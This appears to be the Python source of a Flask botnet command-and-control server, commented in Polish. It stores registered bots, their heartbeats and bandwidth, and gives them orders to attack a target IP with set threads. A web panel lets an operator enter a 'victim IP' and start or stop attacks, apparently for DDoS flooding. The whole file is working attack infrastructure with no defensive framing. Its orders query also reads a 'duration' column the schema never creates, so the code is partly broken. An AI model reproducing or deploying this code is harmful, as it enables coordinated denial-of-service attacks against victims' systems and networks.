import os
import json
from datetime import datetime, timedelta
from flask import Flask, request, jsonify
from flask_cors import CORS
import psycopg2
from psycopg2.extras import RealDictCursor
import urllib.parse

app = Flask(__name__)
CORS(app)

# Pobierz URL bazy danych ze zmiennych środowiskowych
DATABASE_URL = os.environ.get('DATABASE_URL')

def get_db():
    """Połączenie z bazą danych"""
    conn = psycopg2.connect(DATABASE_URL)
    conn.autocommit = True
    return conn

def init_db():
    """Inicjalizacja tabel"""
    conn = get_db()
    cur = conn.cursor()
    
    # Tabela agentów
    cur.execute('''
        CREATE TABLE IF NOT EXISTS agents (
            id TEXT PRIMARY KEY,
            hostname TEXT,
            platform TEXT,
            ip TEXT,
            bandwidth TEXT,
            status TEXT,
            attacking BOOLEAN DEFAULT FALSE,
            last_seen TIMESTAMP,
            registered TIMESTAMP
        )
    ''')
    
    # Tabela ataków
    cur.execute('''
        CREATE TABLE IF NOT EXISTS attacks (
            id SERIAL PRIMARY KEY,
            target_ip TEXT,
            started TIMESTAMP,
            ended TIMESTAMP,
            status TEXT,
            threads INTEGER
        )
    ''')
    
    cur.close()
    conn.close()

# Inicjalizuj bazę przy starcie
init_db()

@app.route('/')
def index():
    """Panel webowy"""
    return '''
    <!DOCTYPE html>
    <html>
    <head>
        <title>Botnet C2</title>
        <style>
            body { font-family: Arial; background: #1a1f2f; color: white; }
            .container { max-width: 1200px; margin: auto; padding: 20px; }
            .stats { display: grid; grid-template-columns: repeat(4,1fr); gap: 20px; }
            .card { background: #2a2f4a; padding: 20px; border-radius: 10px; }
            button { background: #4a6fa5; color: white; border: none; padding: 10px; margin: 5px; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>⚡ BOTNET CONTROL PANEL ⚡</h1>
            <div class="stats" id="stats"></div>
            <div style="margin: 20px 0">
                <input id="targetIP" placeholder="IP ofiary">
                <button onclick="startAttack()">START ATAK</button>
                <button onclick="stopAttack()">STOP</button>
            </div>
            <div id="agents"></div>
        </div>
        <script>
            function loadStats() {
                fetch('/api/stats')
                    .then(r => r.json())
                    .then(data => {
                        document.getElementById('stats').innerHTML = `
                            <div class="card">Wszystkie boty: ${data.total_bots}</div>
                            <div class="card">Online: ${data.online_bots}</div>
                            <div class="card">Atakujące: ${data.attacking_bots}</div>
                            <div class="card">Moc: ${data.total_power} Mbps</div>
                        `;
                    });
            }
            
            function startAttack() {
                fetch('/api/attack/start', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({
                        target_ip: document.getElementById('targetIP').value,
                        threads: 100,
                        duration: 300
                    })
                }).then(() => loadStats());
            }
            
            function stopAttack() {
                fetch('/api/attack/stop', {method: 'POST'}).then(() => loadStats());
            }
            
            setInterval(loadStats, 2000);
            loadStats();
        </script>
    </body>
    </html>
    '''

@app.route('/api/register', methods=['POST'])
def register():
    """Rejestracja agenta"""
    data = request.json
    conn = get_db()
    cur = conn.cursor()
    
    cur.execute('''
        INSERT INTO agents (id, hostname, platform, ip, bandwidth, status, last_seen, registered)
        VALUES (%s, %s, %s, %s, %s, %s, %s, %s)
        ON CONFLICT (id) DO UPDATE SET
            hostname = EXCLUDED.hostname,
            platform = EXCLUDED.platform,
            ip = EXCLUDED.ip,
            status = EXCLUDED.status,
            last_seen = EXCLUDED.last_seen
    ''', (
        data['id'], data['hostname'], data['platform'], data['ip'],
        data.get('bandwidth', '100Mbps'), 'online', datetime.now(), datetime.now()
    ))
    
    cur.close()
    conn.close()
    return jsonify({'status': 'registered'})

@app.route('/api/heartbeat/<agent_id>', methods=['POST'])
def heartbeat(agent_id):
    """Heartbeat od agenta"""
    data = request.json
    attacking = data.get('attacking', False)
    
    conn = get_db()
    cur = conn.cursor()
    
    cur.execute('''
        UPDATE agents 
        SET last_seen = %s, status = 'online', attacking = %s
        WHERE id = %s
    ''', (datetime.now(), attacking, agent_id))
    
    cur.close()
    conn.close()
    return jsonify({'status': 'ok'})

@app.route('/api/orders/<agent_id>')
def get_orders(agent_id):
    """Pobierz rozkazy dla agenta"""
    conn = get_db()
    cur = conn.cursor()
    
    cur.execute('''
        SELECT target_ip, threads, duration FROM attacks 
        WHERE status = 'active' 
        ORDER BY started DESC LIMIT 1
    ''')
    
    attack = cur.fetchone()
    cur.close()
    conn.close()
    
    if attack:
        return jsonify({
            'target_ip': attack[0],
            'threads': attack[1],
            'duration': attack[2]
        })
    else:
        return jsonify({'stop': True})

@app.route('/api/attack/start', methods=['POST'])
def start_attack():
    """Rozpocznij atak"""
    data = request.json
    conn = get_db()
    cur = conn.cursor()
    
    # Zakończ poprzednie ataki
    cur.execute('''
        UPDATE attacks SET status = 'stopped', ended = %s
        WHERE status = 'active'
    ''', (datetime.now(),))
    
    # Nowy atak
    cur.execute('''
        INSERT INTO attacks (target_ip, started, status, threads)
        VALUES (%s, %s, %s, %s)
    ''', (data['target_ip'], datetime.now(), 'active', data.get('threads', 100)))
    
    cur.close()
    conn.close()
    return jsonify({'status': 'attack_started'})

@app.route('/api/attack/stop', methods=['POST'])
def stop_attack():
    """Zatrzymaj atak"""
    conn = get_db()
    cur = conn.cursor()
    
    cur.execute('''
        UPDATE attacks SET status = 'stopped', ended = %s
        WHERE status = 'active'
    ''', (datetime.now(),))
    
    cur.close()
    conn.close()
    return jsonify({'status': 'attack_stopped'})

@app.route('/api/stats')
def get_stats():
    """Statystyki"""
    conn = get_db()
    cur = conn.cursor(cursor_factory=RealDictCursor)
    
    # Wszyscy agenci
    cur.execute('SELECT COUNT(*) as count FROM agents')
    total_bots = cur.fetchone()['count']
    
    # Online (ostatnie 60 sekund)
    threshold = datetime.now() - timedelta(seconds=60)
    cur.execute('SELECT COUNT(*) as count FROM agents WHERE last_seen > %s', (threshold,))
    online_bots = cur.fetchone()['count']
    
    # Atakujący
    cur.execute('SELECT COUNT(*) as count FROM agents WHERE last_seen > %s AND attacking = TRUE', (threshold,))
    attacking_bots = cur.fetchone()['count']
    
    cur.close()
    conn.close()
    
    return jsonify({
        'total_bots': total_bots,
        'online_bots': online_bots,
        'attacking_bots': attacking_bots,
        'total_power': attacking_bots * 100
    })

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 10000))
    app.run(host='0.0.0.0', port=port)
